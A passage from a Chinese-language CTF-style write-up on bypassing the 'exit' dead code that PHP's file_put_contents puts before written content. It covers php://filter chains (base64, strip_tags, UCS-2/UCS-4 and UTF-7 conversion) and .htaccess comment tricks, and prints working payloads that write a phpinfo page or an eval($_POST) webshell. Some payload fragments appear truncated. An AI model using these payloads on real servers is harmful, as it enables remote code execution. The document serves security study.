exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php`然后会对其进行一次整体的base64-decode。从而分解掉死亡代码，但是有个小问题，当时我也有点不解，一直无法生成content；虽然文件创建成功，但是就是无法生成content。翻了翻cyc1e师傅的文章，和其他文章
，发现问题在于‘=’；
都知道‘=’在base64中的作用是填充，也就是以为着结束；在‘=’的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的。如下图所示；
这里因为是由于‘=’从而使得我们写入content不成功，那么我们可以想个方法去掉等号即可，
## **去掉等号之过滤器嵌套base64**
payload：
`php://filter/string.strip.tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8%2B.php`如此payload我们测试看看载荷效果；
发现可以生成文件，并且可以看到我们已经成功写入了shell；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；
改payload为此：`php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php`我们将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成s1mple.php文件；从而就可以生成正常的文件名；载荷效果如下：
## **去掉等号之直接对内容进行变性另类base64**
其实这种也是借助于过滤器，但是原理并不是和之前的原理一样，之前的原理即是：闭合原本的死亡代码，然后在进行过滤器过滤掉内容中的html标签，从而对剩下的内容进行base64解码。但是这种方法却不是如此，payload如下：
`php://filter/PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php`
这种方法也是新奇，在一片文章中发现，但是他的payload无法进行攻击成功，我借助其思路重新构造了一个新的payload；这种payload的攻击原理即是首先直接在内容时，就将我们base64遇到的‘=’这个问题直接写在``中进行过滤掉，然后base64-decode再对原本内容的`|/resource=s1mple.php`这里``的rot13编码即为``,所以这里可以进行写入；载荷效果如下：
其原理就是利用转码从而将原本的死亡代码进行转码从而使引擎无法识别从而避免死亡代码；
## **convert.iconv.**
这个过滤器需要 php 支持 `iconv`，而 iconv
是默认编译的。使用convert.iconv.*过滤器等同于用`iconv()`函数处理所有的流数据。 然而 我们可以留意到 `iconv —
字符串按要求的字符编码来转换`;;其用法：`iconv ( string $in_charset , string $out_charset ,
string $str ) : string` 将字符串 `str` 从 `in_charset` 转换编码到 `out_charset`。
就其功能而论，有点类似于`base_convert`的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；（可以类比）；由此记得国赛的一道love_math的题目，有了base_convert之后就可以尽情的转换从而getshell；
那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；
### **1.usc-2**
通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）
payload：`php://filter/convert.iconv.UCS-2LE.UCS-2BE|??/resource=s1mple.php`;其实也是变向的转换回来，从而利用那一次转换对死亡代码进行扰乱；载荷效果如下：
### **2.usc-4**
活用convert.iconv。可以进行usc-4编码转化；就是4位一反转；类比可知，构造的shell代码应该是usc-4中的4倍数；
通过测试我们可以明确的看到确实是需要是4的倍数才可以进行，否则会进行报错；
payload：`php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp??;)/resource=s1mple.php`荷载效果如下：
### 3.utf-8与utf-7之间的转化
经过测试发现如下的现象：
这里发现生成的是`+AD0-`,然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以使用这种方法避免等号对我们base64解码的影响；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shell；算上是一种组合拳；
`php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php`
载荷效果如下：
## **第三种情况**
`file_put_contents($filename,$content . "\nxxxxxx");`
面对此情况相对来说要比之前的两种还要在某种程度上来说要简单一点，我们只需要让后面的杂糅代码注释掉，或者分解掉都是可以的，目的就是不让杂糅代码干扰；
这种情形一般考点都是禁止有特殊起始符和结束符号的语言，举个例子，如果题目没有ban掉php，那么我们可以轻而易举的写入php代码，因为php代码有特殊的起始符和结束符，所以后面的杂糅代码，并不会对其产生什么影响，载荷效果如下：
所以这类问题的考点，往往在于我们没有办法去写入这类的有特殊起始符和结束符号的语言，往往是需要想办法处理掉杂糅代码的；常见的考点是利用.htaccess进行操作；都知道，.htaccess文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用注释符将杂糅的代码进行注释，然后才可以正常访问；
这里对于换行符我们直接进行 `\` 注释即可。然后再嵌入#注释符，从而达到单行注释就可以将杂糅代码注释掉的效果；载荷效果如下
可以发现直接利用，对于这种没有unlink的题目，我们也是可以反复写入.htaccess进行覆盖的，但是前提是我们写入的.htaccess文件格式不能出现错误，如果出现错误，则会触发报错，题目就会锁死。所以对待此类问题应当小心谨慎；回到刚才，我们可以反复的写入，那么我们就可以方法很多；具体看我之前的一两篇文章即可；
## **总结：**
以上是我测试利用成功的三种情况下的利用方式，也写入了自己的新思路以及新型利用方式，都已经测试成功；另外至于组合拳，其实也是可以有多种方法，譬如各种编码相互转化，，甚至三种编码相互转化都是可以的；只要将过滤器和解码内容相对应即可，师傅们可以自行测试各种编码相互转化的组合拳；这里不在过多赘述了；
**References**
[https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/](https://cyc1e183.github.io/2020/04/03/关于file_put_contents的一些小测试/)